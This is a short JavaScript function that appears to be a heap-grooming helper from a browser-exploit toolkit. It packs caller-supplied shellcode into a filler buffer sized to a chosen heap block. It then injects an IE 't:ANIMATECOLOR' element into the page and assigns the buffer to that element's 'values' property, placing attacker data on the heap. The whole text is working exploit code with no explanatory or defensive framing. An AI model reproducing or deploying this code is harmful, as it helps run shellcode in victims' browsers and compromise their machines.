function mstime_malloc(oArg) {
  var shellcode     = oArg.shellcode;
  var offset        = oArg.offset;
  var heapBlockSize = oArg.heapBlockSize;
  var objId         = oArg.objId;

  if (shellcode     == undefined) { throw "Missing argument: shellcode"; }
  if (offset        == undefined) { offset = 0; }
  if (heapBlockSize == undefined) { throw "Size must be defined"; }

  var buf = "";
  for (var i=0; i < heapBlockSize/4; i++) {
    if (i == offset) {
      if (i == 0) { buf += shellcode;       }
      else        { buf += ";" + shellcode; }
    }
    else {
      buf += ";#W00TA";
    }
  }

  var e = document.getElementById(objId);
  if (e == null) {
    var eleId = "W00TB"
    var acTag = "<t:ANIMATECOLOR id='"+ eleId  + "'/>"
    document.body.innerHTML = document.body.innerHTML + acTag;
    e = document.getElementById(eleId);
  }
  try { e.values = buf; }
  catch (e) {}
}